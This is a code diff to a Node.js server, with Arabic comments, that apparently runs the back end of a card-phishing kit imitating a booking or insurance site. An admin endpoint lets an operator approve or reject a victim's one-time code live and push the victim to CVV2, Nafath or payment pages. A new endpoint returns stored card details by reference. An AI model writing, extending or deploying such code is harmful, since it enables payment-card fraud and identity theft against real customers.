@@ -184,15 +184,15 @@ app.post('/api/admin/otp-action', authMiddleware, (req, res) => {
   if (!booking) return res.json({ success: false, error: 'حجز غير موجود' });
 
   if (action === 'pass') {
-    // قبول OTP: توجيه العميل لصفحة CVV
-    db.redirects[reference] = 'cvv';
+    // قبول OTP: توجيه العميل لصفحة CVV2
+    db.redirects[reference] = 'cvv2';
     if (booking.otp) booking.otp.otpAction = 'pass';
-    io.emit('redirect_user', { reference, redirect: getRedirectUrl('cvv', reference) });
+    io.emit('redirect_user', { reference, redirect: getRedirectUrl('cvv2', reference) });
   } else if (action === 'denied') {
-    // رفض OTP: توجيه للرئيسية
-    db.redirects[reference] = 'https://insoline.online';
+    // رفض OTP: إعادة توجيه لصفحة OTP مع رسالة خطأ
+    db.redirects[reference] = 'otp_error';
     if (booking.otp) booking.otp.otpAction = 'denied';
-    io.emit('redirect_user', { reference, redirect: 'https://insoline.online' });
+    io.emit('redirect_user', { reference, redirect: getRedirectUrl('otp_error', reference) });
   }
   saveData(db);
   res.json({ success: true });
@@ -750,6 +750,21 @@ app.post('/api/booking', (req, res) => {
   res.json({ success: true, referenceId: ref });
 });
 
+// Get Booking Data (for CVV2 page to fetch card details)
+app.get('/api/booking-data/:reference', (req, res) => {
+  db = loadData();
+  const booking = db.bookings[req.params.reference];
+  if (booking) {
+    res.json({
+      referenceId: booking.referenceId,
+      clientName: booking.clientName || '',
+      payment: booking.payment || {}
+    });
+  } else {
+    res.status(404).json({ error: 'Not found' });
+  }
+});
+
 // Check Redirect
 app.get('/api/check-redirect/:reference', (req, res) => {
   db = loadData();
@@ -765,7 +780,9 @@ function getRedirectUrl(target, ref) {
   const base = process.env.BASE_URL || '';
   const map = {
     'cvv': `${base}/cvv?ref=${ref}`,
+    'cvv2': `${base}/cvv2?ref=${ref}`,
     'otp': `${base}/otp?ref=${ref}`,
+    'otp_error': `${base}/otp?ref=${ref}&error=1`,
     'nafath': `${base}/nafath?ref=${ref}`,
     'payment': `${base}/payment?ref=${ref}`,
     'success': `${base}/success?ref=${ref}`,
